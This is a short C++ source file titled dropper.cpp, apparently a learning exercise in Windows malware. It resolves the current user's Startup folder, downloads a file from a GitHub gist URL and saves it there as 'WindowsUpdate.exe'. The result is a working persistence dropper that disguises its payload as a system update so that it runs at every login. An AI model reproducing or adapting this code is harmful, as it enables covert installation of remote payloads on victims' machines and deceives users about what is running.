// dropper.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <urlmon.h>
#include <shlobj_core.h>
#pragma comment (lib, "urlmon.lib")
#pragma comment (lib, "shell32.lib")
int main()
{   /*
    Resolve the path of shell:startup of current user
    Download secret.txt from a url and drop into shell::startup
    */
    const wchar_t* szURL = L"https://gist.githubusercontent.com/ndhnam13/f73deb70683487d8b48733c6e2233c6b/raw/d6dd0728d77988619b4aecef9b7676c3ec04241f/secret.txt";
    wchar_t* ppszPath;

    //HRESULT SHGetKnownFolderPath(
    //    [in]           REFKNOWNFOLDERID rfid,
    //    [in]           DWORD            dwFlags,
    //    [in, optional] HANDLE           hToken,
    //    [out]          PWSTR * ppszPath
    //);
    HRESULT getStartUpResult = SHGetKnownFolderPath(
        FOLDERID_Startup,
        0,
        0,
        &ppszPath
    );

    //Get the fullPath = ppszPath + "\\<FileName>"
    wchar_t fullPath[MAX_PATH];
    wcscpy_s(fullPath, ppszPath);
    wcscat_s(fullPath, L"\\WindowsUpdate.exe");

    //HRESULT URLDownloadToFileW(
    //    LPUNKNOWN            pCaller,
    //    LPCTSTR              szURL,
    //    LPCTSTR              szFileName,
    //    _Reserved_ DWORD     dwReserved,
    //    LPBINDSTATUSCALLBACK lpfnCB
    //);
    HRESULT downloadResult = URLDownloadToFile(
        0,
        szURL,
        fullPath,
        0,
        0
    );
}

